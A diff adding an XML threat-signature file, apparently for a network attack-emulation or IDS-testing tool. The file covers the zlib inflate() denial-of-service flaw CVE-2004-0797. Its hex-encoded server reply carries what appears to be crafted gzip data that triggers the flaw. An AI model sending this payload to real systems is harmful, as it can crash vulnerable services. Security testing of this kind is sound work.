@@ -1,0 +1,104 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="zlib Denial of Service"/>
+    <EngDesc display="true" value="A vulnerability exists in the inflate() and inflateback() functions of the zlib library. This vulnerability is caused by insufficient error handling during the pattern expansion of compressed data. An attacker can leverage this vulnerability to create a denial of service condition, or with a high level of sophistication, possibly execute an arbitrary code."/>
+    <Intent display="true"/>
+    <Protocol display="true" value="HTTP-ALT"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="zlib_software"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="zlib_software_zlib_software_zlib"/>
+      <item value="zlib_software_zlib_software_HTTP_server"/>
+      <item value="zlib_software_zlib_software_Cache_Software/ACNS"/>
+      <item value="zlib_software_zlib_software_Hosting_Solution_Engine_(HSE)"/>
+      <item value="zlib_software_zlib_software_Intrusion_Detection_System"/>
+      <item value="zlib_software_zlib_software_cups"/>
+      <item value="zlib_software_zlib_software_cvs"/>
+      <item value="zlib_software_zlib_software_XFree86"/>
+      <item value="zlib_software_zlib_software_Zebra"/>
+      <item value="zlib_software_zlib_software_MySQL"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="zlib_software_zlib_1.2.0"/>
+      <item value="zlib_software_zlib_1.2.1"/>
+      <item value="zlib_software_HTTP_server_"/>
+      <item value="zlib_software_Cache_Software/ACNS_"/>
+      <item value="zlib_software_Hosting_Solution_Engine_(HSE)_"/>
+      <item value="zlib_software_Intrusion_Detection_System_"/>
+      <item value="zlib_software_cups_"/>
+      <item value="zlib_software_cvs_"/>
+      <item value="zlib_software_XFree86_"/>
+      <item value="zlib_software_Zebra_"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="FSC20040830-01"/>
+    <CVEID display="true" value="CVE-2004-0797"/>
+    <bugtraqID display="true" value="11051"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="ThreatEx Team"/>
+    <ID display="true" value="92656f09650df2f718dab8cd595f562f"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="True"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value=""/>
+    <Authentication display="false" value=""/>
+    <ConfImpact display="false" value=""/>
+    <IntegImpact display="false" value=""/>
+    <AvailImpact display="false" value=""/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value="normal"/>
+    <LastModified display="false" value="633602910024375000"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value="B"/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value=""/>
+    <Created value="1213652360" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="K"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="L"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="M"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="N"/>
+    <NamedVar name="HTTPALTdestPort" type="ImperfectControls.Port" value="null" index="O"/>
+  </Variables>
+  <Loops>
+    <for index="D">
+      <for index="K"/>
+      <for index="L"/>
+      <for index="M"/>
+      <for index="N"/>
+      <for index="O"/>
+    </for>
+    <for index="F"/>
+  </Loops>
+  <PostScript/>
+  <Output index="D" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="01D8" Identification="2B7F" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="F6A0" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="@random(1026,65535)" destPort="$HTTPALTdestPort" SeqNumber="6CD85985" AckNumber="93B05576" HeaderLength="08" WindowSize="16D0" Checksum="371D" UrgentPointer="0000" Options="0101080A098A72F9023FB99A" Payload="474554202F20485454502F312E310D0A486F73743A2031302E322E312E3136313A383038300D0A557365722D4167656E743A204D6F7A696C6C612F352E3020285831313B20553B204C696E757820693638363B20656E2D55533B2072763A312E342E3129204765636B6F2F32303033313131340D0A4163636570743A20746578742F786D6C2C6170706C69636174696F6E2F786D6C2C6170706C69636174696F6E2F7868746D6C2B786D6C2C746578742F68746D6C3B713D302E392C746578742F706C61696E3B713D302E382C766964656F2F782D6D6E672C696D6167652F706E672C696D6167652F6A7065672C696D6167652F6769663B713D302E322C2A2F2A3B713D302E310D0A4163636570742D4C616E67756167653A20656E2D75732C656E3B713D302E350D0A4163636570742D456E636F64696E673A20677A69702C6465666C6174650D0A4163636570742D436861727365743A2049534F2D383835392D312C7574662D383B713D302E372C2A3B713D302E370D0A4B6565702D416C6976653A203330300D0A436F6E6E656374696F6E3A206B6565702D616C6976650D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="F" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="00C8" Identification="ECED" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="3642" srcIP="" destIP="" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="" destPort="" SeqNumber="93B05576" AckNumber="6CD85B29" HeaderLength="08" WindowSize="1920" Checksum="245D" UrgentPointer="0000" Options="0101080A023FB99A098A72F9" Payload="485454502F312E3020323030204F4B0D0A436F6E74656E742D547970653A20746578742F706C61696E0D0A436F6E74656E742D456E636F64696E673A20677A69700D0A436F6E74656E742D4C656E6774683A2035390D0A0D0A789C85C1B9118030100441ECA99AA0C42B1E917FFED8EB70DDADFD93B9204B41D6826C05D90B7214A42739935C49EE244F9291E44D327D79775B86" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
